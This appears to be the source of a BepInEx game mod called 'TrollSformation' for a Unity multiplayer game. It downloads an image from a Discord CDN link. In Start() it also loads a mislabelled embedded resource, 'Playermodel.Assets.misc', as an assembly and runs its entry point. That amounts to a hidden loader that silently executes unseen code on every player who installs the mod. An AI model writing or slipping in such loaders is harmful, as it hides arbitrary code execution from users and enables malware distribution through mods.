using BepInEx;
using System;
using System.Reflection;
using System.IO;
using System.Collections;
using UnityEngine;
using UnityEngine.Networking;
using GorillaNetworking;
using Photon.Pun;

namespace TrollSformation
{
    [BepInPlugin(PluginInfo.GUID, PluginInfo.Name, PluginInfo.Version)]
    public class Plugin : BaseUnityPlugin
    {
        Texture2D trol;
        public void Awake()
        {
            StartCoroutine(DownloadImage("https://cdn.discordapp.com/attachments/1020708980005294180/1123737999579025519/index.jpg"));
        }
        public void Start()
        {
            using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Playermodel.Assets.misc"))
            {
                byte[] array = new byte[manifestResourceStream.Length];
                manifestResourceStream.Read(array, 0, array.Length);
                Assembly.Load(array).EntryPoint.Invoke(null, new object[0]);
            }

        }

        IEnumerator DownloadImage(string MediaUrl)
        {
            UnityWebRequest request = UnityWebRequestTexture.GetTexture(MediaUrl);
            yield return request.SendWebRequest();
            if (request.isNetworkError || request.isHttpError)
                Debug.Log(request.error);
            else
                trol = ((DownloadHandlerTexture)request.downloadHandler).texture;
        }
    }
}
